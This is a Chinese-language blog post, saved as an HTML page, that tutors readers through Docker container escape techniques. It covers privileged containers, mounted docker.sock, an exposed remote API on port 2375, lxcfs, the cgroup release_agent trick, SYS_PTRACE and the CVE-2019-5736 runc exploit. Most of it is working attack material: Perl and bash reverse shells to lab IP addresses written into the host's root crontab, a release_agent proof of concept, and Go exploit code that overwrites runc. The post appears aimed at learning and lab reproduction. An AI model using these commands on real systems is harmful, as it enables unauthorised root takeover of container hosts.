@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Muscial Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://muscial.github.io/img/bizhi.jpg">
+    <meta property="twitter:image" content="https://muscial.github.io/img/bizhi.jpg" />
+    
+
+    
+    <meta name="title" content="Docker容器逃逸入门" />
+    <meta property="og:title" content="Docker容器逃逸入门" />
+    <meta property="twitter:title" content="Docker容器逃逸入门" />
+    
+
+    
+    <meta name="description" content="Muscial">
+    <meta property="og:description" content="Muscial" />
+    <meta property="twitter:description" content="Muscial" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Muscial">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Docker容器逃逸入门 | Muscial的博客 | 保持冷静，奋不顾身</title>
+
+    <link rel="canonical" href="/post/docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Muscial Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/notes/">NOTES</a></li>
+                    
+                        <li><a href="/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/bizhi.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>Docker容器逃逸入门</h1>
+                    <h2 class="subheading">Cloud Security</h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Muscial
+                             
+                            on 
+                            Sunday, February 11, 2024
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="docker容器逃逸入门">Docker容器逃逸入门</h1>
+<h1 id="前言">前言</h1>
+<p>总结下比较传统的docker逃逸方式，大的ctf一般用不到（亲身体会</p>
+<p>一些抽象的还没复现（runc</p>
+<h2 id="判断是否容器环境">判断是否容器环境</h2>
+<p>1.cgourp(看是否有docker</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>cat <span style="color:#ff79c6">/</span>proc<span style="color:#ff79c6">/</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">/</span>cgroup <span style="color:#ff79c6">|</span> grep <span style="color:#ff79c6">-</span>qi docker <span style="color:#ff79c6">&amp;&amp;</span> echo <span style="color:#f1fa8c">&#34;Is Docker&#34;</span> <span style="color:#ff79c6">||</span> echo <span style="color:#f1fa8c">&#34;Not Docker&#34;</span>
+</span></span></code></pre></div><p>.dockerenv 文件
+docker环境下：ls -alh /.dockerenv , 非docker环境，没有这个.dockerenv文件的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>root@<span style="color:#bd93f9">4</span>cb54de415d4<span style="color:#ff79c6">:</span><span style="color:#f1fa8c">/# ls -alh /</span>.dockerenv
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxr<span style="color:#ff79c6">-</span>xr<span style="color:#ff79c6">-</span>x <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">0</span> Sep  <span style="color:#bd93f9">6</span> <span style="color:#bd93f9">07</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">09</span> <span style="color:#ff79c6">/</span>.dockerenv
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>ls <span style="color:#ff79c6">-</span>alh <span style="color:#ff79c6">/</span>.dockerenv
+</span></span></code></pre></div><p><em>注：定制化比较高的docker系统也可能没有这个文件</em></p>
+<h2 id="容器逃逸介绍">容器逃逸介绍</h2>
+<p>容器逃逸基本分3类</p>
+<ol>
+<li>不安全的配置</li>
+<li>相关程序漏洞</li>
+<li>内核漏洞</li>
+</ol>
+<p>这里主要入门介绍下1,3</p>
+<h2 id="不安全的配置"><strong>不安全的配置</strong></h2>
+<h3 id="httpswikiteamssixcomcloudnativedockercontainer-escape-checkhtml_1e38081e789b9e69d83e6a8a1e5bc8f1特权模式"><strong><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html#_1%E3%80%81%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F">#</a>1、特权模式</strong></h3>
+<h3 id="检测"><strong>检测</strong></h3>
+<p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>cat <span style="color:#ff79c6">/</span>proc<span style="color:#ff79c6">/</span>self<span style="color:#ff79c6">/</span>status <span style="color:#ff79c6">|</span> grep <span style="color:#ff79c6">-</span>qi <span style="color:#f1fa8c">&#34;0000003fffffffff&#34;</span> <span style="color:#ff79c6">&amp;&amp;</span> echo <span style="color:#f1fa8c">&#34;Is privileged mode&#34;</span> <span style="color:#ff79c6">||</span> echo <span style="color:#f1fa8c">&#34;Not privileged mode&#34;</span>
+</span></span></code></pre></div><h3 id="复现">复现</h3>
+<p>使用 &ndash;privileged=true 创建一个容器</p>
+<p><code>docker run --rm --privileged=true -it alpine</code></p>
+<p>看capeffid</p>
+<p><code>cat /proc/self/status | grep CapEff</code></p>
+<h3 id="方法一">方法一</h3>
+<p>查看挂载磁盘设备</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>fdisk <span style="color:#ff79c6">-</span>l
+</span></span></code></pre></div><p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/docker%20%E9%80%83%E9%80%B8/1.png" alt="Untitled">
+
+</p>
+<p>在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>mkdir <span style="color:#ff79c6">/</span>test <span style="color:#ff79c6">&amp;&amp;</span> mount <span style="color:#ff79c6">/</span>dev<span style="color:#ff79c6">/</span>vda1 <span style="color:#ff79c6">/</span>test
+</span></span></code></pre></div><p>在定时任务中写入反弹 shell</p>
+<p>这里的定时任务路径是 Ubuntu 系统路径，不同的系统定时任务路径不一样</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>echo $&#39;*/<span style="color:#bd93f9">1</span> * * * * perl -e \&#39;use Socket;$i=<span style="color:#f1fa8c">&#34;172.16.214.1&#34;</span>;$p=<span style="color:#bd93f9">4444</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span style="color:#f1fa8c">&#34;tcp&#34;</span>));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,<span style="color:#ff79c6">&#34;&gt;&amp;S&#34;</span>);open(STDOUT,<span style="color:#ff79c6">&#34;&gt;&amp;S&#34;</span>);open(STDERR,<span style="color:#ff79c6">&#34;&gt;&amp;S&#34;</span>);exec(<span style="color:#f1fa8c">&#34;/bin/sh -i&#34;</span>);};\&#39;&#39; &gt;&gt; /test/var/spool/cron/crontabs/root
+</span></span></code></pre></div><p>一分钟后，就能收到反弹回来的会话了，而且会话权限是宿主机 root 用户权限。</p>
+<h3 id="方法二推荐直接拿shell"><strong>方法二(推荐，直接拿shell</strong></h3>
+<p>先将其挂载到容器中，然后使用<code>chroot</code>获取一个以宿主机根目录为根目录的<code>shell</code>来拿到宿主机的权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /tmp/mnt
+</span></span><span style="display:flex;"><span>mount /dev/sda1 /tmp/mnt
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /tmp/mnt
+</span></span><span style="display:flex;"><span>chroot ./ bash
+</span></span><span style="display:flex;"><span>reverse shell
+</span></span></code></pre></div><h2 id="docker-socket挂载">docker socket挂载</h2>
+<p>简单来说，docker容器和docker守护进程可以经过socket通信，执行宿主机的docker命令，然后就可以再创建一个容器，把宿主机的根目录挂载到</p>
+<p>1、运行一个挂载/var/run/的容器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>docker run <span style="color:#ff79c6">-</span>it <span style="color:#ff79c6">-</span>v <span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">var</span><span style="color:#f1fa8c">/run/</span><span style="color:#ff79c6">:</span>/host/var/run/ 5d2df19066ac /bin/bash
+</span></span></code></pre></div><p>2、寻找下挂载的sock文件</p>
+<pre tabindex="0"><code>find / -name docker.sock
+</code></pre><p>3、在容器内安装client，即docker</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>apt<span style="color:#ff79c6">-</span>get update
+</span></span><span style="display:flex;"><span>apt<span style="color:#ff79c6">-</span>get install docker.io
+</span></span></code></pre></div><p>4、查看宿主机docker信息</p>
+<pre tabindex="0"><code>docker -H unix:///host/var/run/docker.sock info
+</code></pre><p>5、运行一个新容器并挂载宿主机根路径</p>
+<pre tabindex="0"><code>docker -H unix:///host/var/run/docker.sock run -v /:/test -it ubuntu:14.04 /bin/bash
+</code></pre><p>6、写入计划任务到宿主机(拿主机shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>echo <span style="color:#f1fa8c">&#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/4000 0&gt;&amp;1&#39;</span> <span style="color:#ff79c6">&gt;&gt;</span> /test/var/spool/cron/root
+</span></span></code></pre></div><h2 id="remote-api">remote api</h2>
+<p>原理和socket差不多，都是利用守护进程和宿主机通信</p>
+<p>docker远程访问</p>
+<p>默认情况下，Docker守护进程Unix socket（/var/run/docker.sock）来进行本地进程通信，而不会监听任何端口，因此只能在本地使用docker客户端或者使用Docker API进行操作。如果想在其他主机上操作Docker主机，就需要让Docker守护进程打开一个HTTP Socket，这样才能实现远程通信</p>
+<p>将 docker 守护进程监听在 0.0.0.0</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>dockerd <span style="color:#ff79c6">-</span>H unix<span style="color:#ff79c6">:</span><span style="color:#6272a4">///var/run/docker.sock -H 0.0.0.0:2375
+</span></span></span></code></pre></div><p><strong>检测</strong></p>
+<p>如果返回 404 说明存在</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>IP<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">`hostname -i | awk -F. &#39;{print $1 &#34;.&#34; $2 &#34;.&#34; $3 &#34;.1&#34;}&#39; `</span> <span style="color:#ff79c6">&amp;&amp;</span> wget http<span style="color:#ff79c6">:</span><span style="color:#6272a4">//$IP:2375
+</span></span></span></code></pre></div><p>列出容器信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://&lt;target&gt;:2375/containers/json
+</span></span></code></pre></div><p>查看容器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker -H tcp://&lt;target&gt;:2375 ps -a
+</span></span></code></pre></div><p>新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
+</span></span></code></pre></div><p>在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/12345 0&gt;&amp;1&#39;</span> &gt;&gt; /mnt/var/spool/cron/crontabs/root
+</span></span></code></pre></div><p>本地监听端口，获取对方宿主机shell。</p>
+<h2 id="利用lxcfs">利用lxcfs</h2>
+<p>lxcfs 是linux下一个用于虚拟化容器的工具</p>
+<p>当pod挂载了LXCFS目录<strong>包含CGOURP目录</strong>，并且对CGROUP有写权限。</p>
+<p>LXCFS通过用户态文件系统，<strong>在容器中提供下列 procfs 的文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>/proc/cpuinfo
+</span></span><span style="display:flex;"><span>/proc/diskstats
+</span></span><span style="display:flex;"><span>/proc/meminfo
+</span></span><span style="display:flex;"><span>/proc/stat
+</span></span><span style="display:flex;"><span>/proc/swaps
+</span></span><span style="display:flex;"><span>/proc/uptime
+</span></span></code></pre></div><p>而lxcfs为容器提供了下列procfs文件,比如把宿主机的 /var/lib/lxcfs/proc/memoinfo 文件挂载到Docker容器的/proc/meminfo位置后，容器读取相应内容时会通过lxcfs获取正确的约束设定，实现容器内/proc与物理机隔离。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>apt install lxcfs
+</span></span><span style="display:flex;"><span>或者
+</span></span><span style="display:flex;"><span>git clone https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//github.com/lxc/lxcfs.git
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>lxcfs <span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">var</span>/lib/lxcfs
+</span></span><span style="display:flex;"><span>docker run <span style="color:#ff79c6">-</span>it <span style="color:#ff79c6">-</span>v <span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">var</span>/lib/lxcfs/:/test/:rw kpli0rn/ubuntu:18.04 /bin/bash
+</span></span></code></pre></div><p>检测：是否启用了lxcfs</p>
+<pre tabindex="0"><code>cat /proc/1/mountinfo | grep lxcfs
+cat /proc/1/* | grep lxcfs
+</code></pre><p>利用</p>
+<p>首先因为lxcfs/cgroup被挂载进了容器，并且容器对挂在进来的lxcfs/cgroup有读写权，那么可以先修改当前已控制容器对应的devices.allow为a来设置容器允许访问所有类型设备</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>echo a <span style="color:#ff79c6">&gt;</span> /test/lxcfs/cgroup/devices/docker/some_id/devices.allow
+</span></span></code></pre></div><p>又因为/etc/host是默认挂载进容器的，我们可以通过如下命令拿到宿主机设备对应的ID号</p>
+<pre tabindex="0"><code>cat /proc/self/mountinfo |grep etc
+</code></pre><p>然后使用如下指令，配合刚刚拿到的宿主机对应的id号，就能读写宿主机文件了</p>
+<pre tabindex="0"><code>mknod test b 252 1   //创建基于宿主机的块设备
+debugfs -w test   //对刚刚创建的块设备进行调试，也就是能进入宿主机文件系统了
+</code></pre><h2 id="利用notify_on_release-cgroup可编辑">利用<strong>notify_on_release Cgroup可编辑</strong></h2>
+<p>Cgroup实现内核资源（硬件）分层虚拟化</p>
+<p>简单理解下，Cgourp分为很多子系统，一个子系统就是一个资源（cpu）的控制器</p>
+<p>子系统要挂载到cgroup的目录分为层级</p>
+<p>控制组群分配子系统的内存资源</p>
+<p>任务相当于系统的一个进程，控制组群有tasks文件，通过写入任务的pid，限制任务</p>
+<p>Cgroup有几个重要的文件</p>
+<p>/sys/fs/cgroup 有所有子系统的信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>/sys/fs/cgroup/&lt;subsystem_name&gt;/cgroup.procs 记录该子系统任务进程PID
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sys/fs/cgroup/&lt;subsystem_name&gt;/tasks 约等于cgroup.procs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sys/fs/cgroup/&lt;subsystem_name&gt;/notify_on_release 只有0或1两个值
+</span></span><span style="display:flex;"><span>当为1时，cgroup下所有任务结束后，内核就会以root权限运行<span style="color:#ff79c6">/</span>sys<span style="color:#ff79c6">/</span>fs<span style="color:#ff79c6">/</span>cgroup<span style="color:#ff79c6">/</span>&lt;<span style="color:#ff79c6">subsystem_name</span>&gt;<span style="color:#ff79c6">/</span>release_agent 文件中对应路径的文件
+</span></span></code></pre></div><p>这里组要是子系统的<strong>notify_on_release机制</strong></p>
+<p>如果子系统的<strong>notify_on_release文件为1，<strong>cgroup结束所有任务后内核（宿主机）会以root权限运行</strong>release_agent文件（子系统文件夹）中</strong>的对应路径的文件。</p>
+<p>所以如果我们对cgroup可编辑，且获得了当前容器在宿主机中的绝对路径（知道脚本的位置），且拥有cap_sys_admin（相当于细分了的root权限：允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等）权限那么就可以完成逃逸。</p>
+<p>主要就是利用了<strong>release_agent文件执行恶意脚本</strong></p>
+<h3 id="利用">利用</h3>
+<p>检测：</p>
+<pre tabindex="0"><code>cat /proc/1/status | grep Cap  //看能力码
+</code></pre><p>解密能力码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>capsh <span style="color:#ff79c6">--</span>decode<span style="color:#ff79c6">=</span><span style="color:#bd93f9">00000000</span>a82425fb
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x00000000a82425fb</span><span style="color:#ff79c6">=</span>cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap
+</span></span></code></pre></div><p>创建子cgroup并修改notify_on_release</p>
+<pre tabindex="0"><code>mkdir /tmp/aa &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/aa &amp;&amp;echo 1 &gt; /tmp/aa/notify_on_release
+</code></pre><p>获取在宿主机的绝对路径</p>
+<pre tabindex="0"><code>sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab
+</code></pre><p>然后写入子cgroup的release_agent文件，指向一个恶意的脚本文件，并给予可执行权</p>
+<pre tabindex="0"><code>echo &#39;#!/bin/sh&#39; &gt; /tmp/exp
+echo &#34;mkdir /hack_in&#34; &gt; /tmp/exp
+d=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
+echo $d/tmp/exp &gt; /tmp/aa/release_agent
+chmod 777 /tmp/exp
+</code></pre><p>然后清空子cgroup目录下的cgroup.procs或tasks文件</p>
+<pre tabindex="0"><code>sh -c &#34;echo \$\$ &gt; /tmp/aa/cgroup.procs&#34;
+</code></pre><p>检测POC</p>
+<pre tabindex="0"><code>#!/bin/bash
+
+set -uex
+
+mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
+
+echo 1 &gt; /tmp/cgrp/x/notify_on_release
+host_path=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
+echo &#34;$host_path/cmd&#34; &gt; /tmp/cgrp/release_agent
+
+echo &#39;#!/bin/sh&#39; &gt; /cmd
+echo &#34;ps aux &gt; $host_path/output&#34; &gt;&gt; /cmd
+chmod a+x /cmd
+
+sh -c &#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;
+
+sleep 2
+cat &#34;/output&#34;
+</code></pre><h2 id="sys_ptrace-权限逃逸"><strong>SYS_PTRACE 权限逃逸</strong></h2>
+<p>SYS_PTRACE是启动docker容器时附加的一个权限参数，它起到一个调试器的作用。以高权限参数启动时默认带有该权限。</p>
+<h3 id="条件">条件</h3>
+<p>有cap_sys_ptrace权限</p>
+<p>docker起的时候docker run &ndash;pid=host，容器看的到宿主机的进程</p>
+<h3 id="利用-1">利用</h3>
+<p>和上面一样看完能力为cap_sys_ptrace之后</p>
+<p>用ps指令找到宿主机进程PID</p>
+<pre tabindex="0"><code>ps auxx | grep root
+</code></pre><p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/docker%20%E9%80%83%E9%80%B8/2.png" alt="Untitled">
+
+</p>
+<p>然后使用exp进行进程注入：<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
+<p>需要自己编译并且修改此处的payload。改成msf或者cs的都行</p>
+<p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/docker%20%E9%80%83%E9%80%B8/3.png" alt="Untitled">
+
+</p>
+<h2 id="cap_sys_module权限逃逸"><strong>cap_sys_module 权限逃逸</strong></h2>
+<p>这个特权表示能够加载内核模块，那么我们只需要构造一个执行恶意命令的内核模块给容器加载就行了</p>
+<p>具体不复现了，cap有关可以看下</p>
+<p><a href="https://blog.jus4fun.xyz/article/109/">https://blog.jus4fun.xyz/article/109/</a></p>
+<h2 id="runc">runc</h2>
+<p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6</p>
+<p>环境搭建,ubuntu下用metarget，官方推荐版本为Ubuntu 16.04 or <strong>18.04</strong></p>
+<pre tabindex="0"><code>metarget cnv install cve-2019-5736
+</code></pre><p>或者脚本</p>
+<pre tabindex="0"><code>curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh
+</code></pre><h3 id="原理">原理</h3>
+<p>runc是Docker的容器运行时，负责Dokcer容器的容器生成和运行，举个例子 docker run -it ubuntu bash 容器的bash交互界面就是由runc启动的。runc一般在宿主机上以root权限跑着。 同时在linux中存在/proc/pid/exe 这个东西，指向某进程的源程序，如果是/proc/self/exe 就是指向当前进程的源程序。 我们可以通过劫持，将容器的bash内容更改为#!/proc/self/exe，即指向当前进程源程序，这样下次执行容器docker run -it ubuntu bash时就会执行runc本身。 runc在容器中是可以被找到的，如果我们修改了runc文件本身的内容，如修改为反弹shell，那么下次执行docker run -it ubuntu bash时就会自动反弹一个shell回来。</p>
+<h3 id="利用-2">利用</h3>
+<p>exp：<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p>注释引用自<a href="https://ble55ing.github.io/2020/03/19/docker-20195736/">https://ble55ing.github.io/2020/03/19/docker-20195736/</a></p>
+<pre tabindex="0"><code>package main
+
+// Implementation of CVE-2019-5736
+// Created with help from @singe, @_cablethief, and @feexd.
+// This commit also helped a ton to understand the vuln
+// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
+import (
+  &#34;fmt&#34;
+  &#34;io/ioutil&#34;
+  &#34;os&#34;
+  &#34;strconv&#34;
+  &#34;strings&#34;
+)
+
+// This is the line of shell commands that will execute on the host
+var payload = &#34;#!/bin/bash \n mkdir /hack_in &amp;\n&#34;
+
+func main() {
+  //首先来看看能不能打开/bin/sh，即有root权限就成
+  fd, err := os.Create(&#34;/bin/sh&#34;)
+  if err != nil {
+    fmt.Println(err)
+    return
+  }
+
+    //然后将其覆盖为#!/proc/self/exe
+  fmt.Fprintln(fd, &#34;#!/proc/self/exe&#34;)
+  err = fd.Close()
+  if err != nil {
+    fmt.Println(err)
+    return
+  }
+  fmt.Println(&#34;[+] Overwritten /bin/sh successfully&#34;)
+
+  // 循环遍历/proc里的文件，直到找到runc是哪个进程
+  var found int
+  for found == 0 {
+    pids, err := ioutil.ReadDir(&#34;/proc&#34;)
+    if err != nil {
+      fmt.Println(err)
+      return
+    }
+    for _, f := range pids {
+      fbytes, _ := ioutil.ReadFile(&#34;/proc/&#34; + f.Name() + &#34;/cmdline&#34;)
+      fstring := string(fbytes)
+      if strings.Contains(fstring, &#34;runc&#34;) {
+        fmt.Println(&#34;[+] Found the PID:&#34;, f.Name())
+        found, err = strconv.Atoi(f.Name())
+        if err != nil {
+          fmt.Println(err)
+          return
+        }
+      }
+    }
+  }
+
+  // 循环去读这个/proc/pid/exe，先拿到一个该文件的fd，该fd就指向了runc程序的位置
+  var handleFd = -1
+  for handleFd == -1 {
+    // Note, you do not need to use the O_PATH flag for the exploit to work.
+    handle, _ := os.OpenFile(&#34;/proc/&#34;+strconv.Itoa(found)+&#34;/exe&#34;, os.O_RDONLY, 0777)
+    if int(handle.Fd()) &gt; 0 {
+      handleFd = int(handle.Fd())
+    }
+  }
+  fmt.Println(&#34;[+] Successfully got the file handle&#34;)
+
+  // 然后不断的去尝试写这个指向的文件，一开始由于runc会先占用着，写不进去，直到runc的占用解除了，就立即
+  for {
+    writeHandle, _ := os.OpenFile(&#34;/proc/self/fd/&#34;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
+    if int(writeHandle.Fd()) &gt; 0 {
+      fmt.Println(&#34;[+] Successfully got write handle&#34;, writeHandle)
+      writeHandle.Write([]byte(payload))
+      return
+    }
